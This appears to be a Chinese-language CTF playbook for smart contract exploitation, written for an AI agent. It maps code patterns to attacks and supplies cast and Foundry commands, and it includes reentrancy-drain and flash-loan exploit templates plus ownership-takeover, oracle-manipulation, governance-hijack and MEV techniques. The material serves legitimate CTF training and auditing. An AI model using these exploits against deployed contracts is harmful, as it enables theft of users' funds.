# 区块链 / 智能合约漏洞挖掘决策树

> 适用题型：区块链系统、智能合约、链上交互逻辑与资产流转。
> AI agent 读完即知「看到什么代码模式 → 执行什么命令 → 拿 flag」。所有命令可复制执行。

## A. 区块链 CTF 解题流程（5 步法）

| 步骤 | 动作 | 关键命令 / 操作 | 产出 |
|------|------|----------------|------|
| **1. 侦察** | 识别链类型、RPC、合约地址、源码/字节码 | `cast chain-id --rpc-url $RPC`；`cast code $ADDR --rpc-url $RPC`；浏览题目给的 `Setup.sol` / `Deploy.sol` | RPC URL、私钥、Setup 地址、Target 地址、win 条件 |
| **2. 合约分析** | 读源码或反编译；定位 `isSolved()` / win 条件；画状态流 | 有源码→通读；无源码→`cast disassemble` / Dedaub / heimdall；`cast storage $ADDR 0 --rpc-url $RPC` 读槽位 | win 条件清单、可疑函数清单 |
| **3. 漏洞识别** | 按本文件 §B 决策树逐项扫描 | `slither .` 静态分析；手动对照 §B 表格 | 漏洞类型 + 触发点 |
| **4. 构造 exploit** | 写 Exploit.sol 或 web3.py 脚本；本地 fork 验证 | `forge test --fork-url $RPC -vvv`；`anvil --fork-url $RPC` | 验证通过的 exploit 合约/脚本 |
| **5. 提交拿 flag** | 部署 exploit、调用、触发 `isSolved()==true` | `forge create` / `cast send`；最后 `cast call $SETUP "isSolved()(bool)"` 应返回 `true` | flag |

**通用环境变量约定**（每个 CTF 先设好）：
```bash
RPC="http://<host>:<port>/<uuid>"
SETUP="0x..."          # Setup 合约地址
TARGET="0x..."         # 目标合约（从 Setup 合约的 public 变量读出）
PK="0x<player_privkey>"
```

## B. 智能合约漏洞决策树（信号 → 打法）

> 格式：**看到 X 代码模式** → 漏洞类型 → 利用方式 → 验证命令

### B1. 重入攻击（Reentrancy）

| 信号 | 子类型 | 利用 | 验证 |
|------|--------|------|------|
| `.call{value:...}("")` 在 `balances[x]=0` **之前**；无 `nonReentrant` | 单函数重入 | Exploit 合约 `fallback()` 里递归调 `withdraw()`，余额清零前反复提款 | `forge test --fork-url $RPC -vvv` 看 drain |
| 多函数共享状态、A 先 `call` 后改、B 读旧状态 | 跨函数重入 | 在 `fallback` 中调用另一函数（如 `borrow`/`balanceOf`）利用未更新状态 | Slither `reentrancy-benign`/`no-eth` |
| view 函数读未锁状态 + 外部调用后依赖该值 | 只读重入（read-only） | 先调 view 取值→触发带 callback 的外部调用→回调中值已变 | 手动审计 `view`+外部调用组合 |
| `transfer()`/`send()`（2300 gas）→ 老式防重入 | gas 限制绕过 | 用 `.call{}` 替换或利用 push payment | — |

**Exploit 模板**（直接改用）：
```solidity
contract Exploit {
    Target t;
    constructor(address _t) { t = Target(_t); }
    function attack() external payable {
        t.deposit{value: msg.value}();
        t.withdraw();
    }
    receive() external payable {
        if (address(t).balance >= 1 ether) t.withdraw(); // 递归
    }
}
```

### B2. 整数溢出 / 下溢

| 信号 | 漏洞 | 利用 |
|------|------|------|
| `pragma solidity ^0.7.x` 或更低 + 无 SafeMath | underflow/overflow | `uint256(0) - 1 = 2^256-1`；`uint8` 超 255 归 0；绕过余额/时间锁 |
| `require(balance - amount >= 0)` (uint 永真) | 逻辑错误 | 直接减到下溢 |
| Solidity ≥ 0.8.0 但有 `unchecked {...}` | unchecked 块溢出 | 在块内复现老式溢出 |
| 数组 `.length` 可写 / `pop` 空数组 (老版) | 存储碰撞 | 溢出 length 到 `2^256-1` 写任意槽 |

### B3. 访问控制缺失

| 信号 | 漏洞 | 利用 |
|------|------|------|
| 鉴权用 `tx.origin == owner` | 钓鱼提权 | 诱导 owner 调用攻击合约，攻击合约再调目标 |
| 关键函数无 `onlyOwner` / 无 modifier | 任意调用 | `cast send $TARGET "setOwner(address)" $ME` 直接接管 |
| `public` 函数本应 `internal`（如初始化函数） | 初始化劫持 | 抢先调 `initialize()` 设自己为 owner |
| `constructor` 名拼错（老版 <0.5.0）或用 `Keccak256` 比对 | 构造函数变 public | 直接调「构造函数」重置状态 |
| `delegatecall` 到用户可控地址 | 任意代码执行 | 部署恶意 impl，delegatecall 过去改 owner 槽 |
| `msg.sender` 被假定为特定合约 | 角色混淆 | 用合约而非 EOA 调用绕过 |

### B4. 闪电贷攻击（Flash Loan）

**三步固定流程**：借（Aave/dYdX/Balancer）→ 操纵（价格/投票/流动性）→ 还（同一交易）。

| 信号 | 漏洞 | 利用 |
|------|------|------|
| 价格来自 Uniswap V2 spot / 单一 DEX | 闪电贷操纵价格 | 借巨量资产砸盘/拉盘→改 AMM 价格→按操纵价借贷/清算 |
| 治理投票权基于当前余额（无快照/延迟） | 治理劫持 | 闪电贷借治理代币→投票通过恶意提案→还款 |
| 清算逻辑依赖可操纵的抵押率 | 清算套利 | 操纵抵押物价格触发非健康清算，套取奖励 |
| `balanceOf` 直接当作可信值（LP token / 自定义 ERC20） | 假代币注入 | 部署恶意 token 实现 `balanceOf` 返回巨值，注入协议 |

**通用 Flash Loan 模板**：
```solidity
// 在 executeOperation 里完成操纵 + 还款
function attack() external {
    ILender(pool).flashLoan(this, asset, amount, "");
}
function executeOperation(...) returns (bool) {
    // 1. 操纵（swap/投票/清算）
    // 2. 套利
    // 3. approve 还款
    return true;
}
```

### B5. 预言机操纵

| 信号 | 漏洞 | 利用 |
|------|------|------|
| `IUniswapV2Pair.getReserves()` 直接算价 | 单块可操纵 | 闪电贷在同交易改储备金 |
| 用 `block.timestamp` 当价格源 | 时间戳操纵 | 矿工/同交易改 |
| 无 TWAP / 无多源 | 无平滑 | 同上 |
| 用 `Chainlink` 但未查 `updatedAt` / `latestAnswer==0` | 陈旧/异常喂价 | 强制返回 0 或利用断流窗口 |

**修复特征（看到就知道不能打）**：Uniswap V3 TWAP、Chainlink `latestRoundData` + 时效检查、多预言机取中位数。

### B6. unchecked 外部调用返回值

| 信号 | 漏洞 | 利用 |
|------|------|------|
| `token.transfer(...)` 无返回值检查 | silent failure | 部署假 token 返回 false，合约误以为成功 |
| `.call(...)` 后只 `(bool ok,)` 不 require | 状态不一致 | 让调用失败但合约继续执行 |
| `ecrecover` 返回值未校验 `address(0)` | 签名伪造 | 用非法签名拿到 `address(0)`，若 owner 默认 0 则提权 |

### B7. 随机数预测

| 信号 | 漏洞 | 利用 |
|------|------|------|
| `uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender)))` | 链上可预测 | 同交易部署合约实时复算同样结果 |
| `blockhash(block.number)` 或 `block.number-1` | 可预测 | 同上；`block.number` 的 blockhash 为 0 |
| `block.timestamp` 当随机 | 矿工可控 | 同交易可控 |

**Exploit 合约里直接复刻题目算法即可，输入完全可读**（见 §C Foundry fork 测试）。

### B8. delegatecall 滥用

| 信号 | 漏洞 | 利用 |
|------|------|------|
| `delegatecall` 到可升级 / 用户可控 logic | 存储碰撞提权 | 按目标合约存储布局构造恶意 logic，覆盖 owner 槽 |
| 代理 + impl slot 用固定槽而非 EIP-1967 | slot 碰撞 | 找到与业务变量重叠的 slot 覆盖 |
| 库合约（library）用 `delegatecall` 但 `msg.sender` 被信任 | 上下文错位 | 利用 delegatecall 上下文执行任意逻辑 |
| 未初始化 storage 指针传给 delegatecall | 存储覆盖 slot 0 | 写 owner slot |

### B9. 自毁（selfdestruct）

| 信号 | 漏洞 | 利用 |
|------|------|------|
| 合约余额假设 `>0` 才放行 | 强制打款 | `selfdestruct` 强制往目标转 ETH（即使无 payable）破坏不变量 |
| `require(address(this).balance == 0)` | 同上 | 强制注入 ETH |
| 题目含 `selfdestruct` 且参与地址计算 | 地址劫持 | 预测 CREATE2 地址 |

> 注：EIP-6780（上海升级后）selfdestruct 仅在同交易创建时强制转 ETH，老题仍按旧语义。

### B10. 拒绝服务（DoS）

| 信号 | 漏洞 | 利用 |
|------|------|------|
| `for (i; i<array.length; ++i)` 遍历用户可控数组 | gas 限制 DoS | 把数组撑大→交易 revert |
| `.transfer()` 给用户合约（2300 gas） | 钱包拒收 | 部署 revert 的 receive 锁死退款流程 |
| mapping 遍历依赖某个特定地址 | 拒绝关键调用 | 让该地址变成有恶意 fallback 的合约 |
| `require()` 内调用外部不可控合约 | 环境依赖 | 若依赖合约被部署者控制则可任意 revert |

### B11. 前端运行 / MEV

| 信号 | 漏洞 | 利用 |
|------|------|------|
| 提交顺序影响结果（抢购/清算） | 抢跑 | Flashbots bundle 原子提交；监听 mempool 抢先 |
| 无滑点保护 (`minOut=0`) | 三明治 | 前后夹击套利 |

### B12. 签名重放 / 伪造

| 信号 | 漏洞 | 利用 |
|------|------|------|
| `ecrecover` 无 nonce / 无 chain 限定 | 重放 | 同签名多次执行，或跨链重放 |
| 签名只用 `abi.encodePacked` 拼 bytes32+uint | 哈希碰撞 | 构造另一组 (addr,uint) 拼接相同 |
| 不校验 `ecrecover != address(0)` | 零地址伪造 | 非法签名返回 0，若校验地址默认 0 则冒充 |
| 同一 nonce 跨多交易（椭圆曲线） | 私钥恢复 | 从两签名中 r 相同→算私钥 |
| `msg.sender` 用签名当身份但不防重放 | 签名重放 | 重放已用过的签名 |

## C. 工具链（看到什么 → 用什么）

| 场景 | 工具 | 精确命令 |
|------|------|---------|
| **静态扫漏洞** | Slither | `slither .` ；`slither . --detect reentrancy-eth,arbitrary-send,tx-origin` |
| **模糊测试找不变量** | Echidna | `echidna-test contract.sol --contract Test --config echidna.yaml` |
| **本地 fork 主网** | anvil / forge | `anvil --fork-url $MAINNET_RPC --fork-block-number $N`；`forge test --fork-url $RPC -vvv` |
| **读链状态** | cast | `cast call $ADDR "func()"`；`cast storage $ADDR <slot>`；`cast code $ADDR` |
| **发交易** | cast | `cast send $ADDR "func(uint256)" $VAL --rpc-url $RPC --private-key $PK` |
| **部署 exploit** | forge | `forge create src/Exploit.sol:Exploit --rpc-url $RPC --private-key $PK --constructor-args $TARGET` |
| **解析 4 字节签名** | cast | `cast 4byte 0x9e5faafc`；`cast 4byte-decode <calldata>` |
| **查交易/区块** | cast | `cast tx $HASH`；`cast block $N --full`；`cast block-number --rpc-url $RPC` |
| **反编译字节码** | Dedaub / ethervm.io / heimdall | `heimdall decompile --bytecode 0x...` ；在线贴 `cast code` 输出 |
| **EVM 汇编级调试** | forge | `forge test --fork-url $RPC -vvvvv`（看 trace）；`forge debug` |
| **快速手动交互** | Remix / MetaMask | 浏览器连 custom RPC |
| **脚本化 exploit** | web3.py / ethers.js | 复杂多步交易编排 |

**Foundry exploit 测试骨架**（CTF 标准模板）：
```solidity
// test/Exploit.t.sol
import "forge-std/Test.sol";
contract ExploitTest is Test {
    Setup setup; Target target;
    function setUp() public {
        setup = new Setup();              // 或 attach 已部署地址
        target = setup.TARGET();
        vm.deal(address(this), 100 ether);
    }
    function testExploit() public {
        // 攻击者用 player 身份
        vm.startPrank(player);
        // ... exploit 调用 ...
        vm.stopPrank();
        assertTrue(setup.isSolved(), "not solved");
    }
}
```

## D. 无源码场景（只有字节码）

**反编译流程**：
1. `cast code $ADDR --rpc-url $RPC > target.hex` 取字节码
2. `heimdall decompile --bytecode $(cat target.hex)` 或贴 Dedaub/ethervm.io
3. `cast disassemble $(cat target.hex)` 取纯汇编对照
4. 用 `cast 4byte <selector>` 还原函数名

**字节码模式识别**：

| 字节码模式 | 对应含义 |
|-----------|---------|
| 连续 `PUSH1 0x0 DUP1 SSTORE` 多组 | 状态变量初始化（清零各槽） |
| `SLOAD` 后紧跟 `SSTORE` 同槽 | 读写状态变量 |
| `CALLVALUE` + `JUMPI` 早返回 | `payable` 检查 |
| `CALLER` + `EQ` + `JUMPI` | `msg.sender == X` 鉴权 → 找 owner 地址 |
| `ORIGIN` | `tx.origin` 用法（高危信号） |
| `CALL` 带 gas 2300 | `transfer`/`send` |
| `DELEGATECALL` | 可升级/库 → 存储碰撞风险 |
| `SELFDESTRUCT` | 自毁 |
| `STATICCALL` | view 调用 |
| `CREATE` / `CREATE2` | 部署子合约（地址可预测） |

**从 ABI 推函数用途**：用 `cast 4byte-decode <calldata>` 解出参数，结合函数名 + 参数类型反推语义。

**私钥/常量提取**：`cast storage` 逐槽读（含 private 变量——链上无隐私）。从部署交易 input 解析 constructor 参数。

## E. CTF 特殊技巧

### E1. 拿 flag 的标准机制

| 机制 | 检测方式 |
|------|---------|
| Setup 合约 `isSolved()` 返回 `true` | `cast call $SETUP "isSolved()(bool)"` → 平台轮询发 flag |
| 达到某条件（余额=0 / owner 变更 / locked=false） | 平台查链上状态 |
| flag 直接藏在交易历史 / IPFS / 事件 log | `cast logs` / Etherscan 翻 input data |
| 调用 `solve()` 一键过 | `cast send $SETUP "solve()"` |

**最后必做验证**：
```bash
cast call $SETUP "isSolved()(bool)" --rpc-url $RPC   # 期望 true
```

### E2. 本地 fork 测试（闪电贷题必备）

```bash
anvil --fork-url $RPC --fork-block-number <题目指定块>
forge test --fork-url $RPC --fork-block-number <N> -vvv
```
主网 fork 让 flash loan 能借到真实流动性（Aave/dYdX），且能复现题目历史状态（Paradigm CTF 常固定 block 11800000 附近）。

### E3. Setup.sol / Deploy.sol 的作用

| 文件 | 作用 |
|------|------|
| `Setup.sol` | 平台部署，持有 player 身份；暴露 `TARGET()`/`isSolved()`；constructor 部署目标并注入初始状态 |
| `Deploy.sol` / `chal.py` | 一键部署脚本，常含 constructor 参数（golden key / combinations 等）→ **必查部署交易 input data 提取密钥** |

**提取部署参数**：
```bash
cast tx $DEPLOY_TX --rpc-url $RPC     # 看 input 字段
cast 4byte-decode <input>
```

### E4. gas 优化与 gas limit 陷阱

| 陷阱 | 对策 |
|------|------|
| 题目设了低 gas limit 阻止复杂 exploit | 优化循环、用 assembly、预计算 |
| for 循环遍历用户可控数组爆 gas | 正是题目考点（DoS 反向：构造让它 revert） |
| `call` 不指定 gas → 默认 63/64 规则 | 显式 `{gas: ...}` |
| 重入递归耗 gas | 控制递归深度，或用 CREATE2 预备合约 |

### E5. 快速侦察 checklist（拿到题先跑一遍）

```bash
export RPC=... SETUP=... PK=...
cast chain-id --rpc-url $RPC              # 确认链
cast block-number --rpc-url $RPC          # 当前高度
cast code $SETUP --rpc-url $RPC           # Setup 是否有源码
cast call $SETUP "isSolved()(bool)"       # 当前状态
cast call $SETUP "TARGET()(address)" 2>/dev/null  # 读目标
cast storage $SETUP 0 --rpc-url $RPC      # 看槽 0（常是 owner/solved）
slither . 2>/dev/null                     # 有源码则静态扫
```
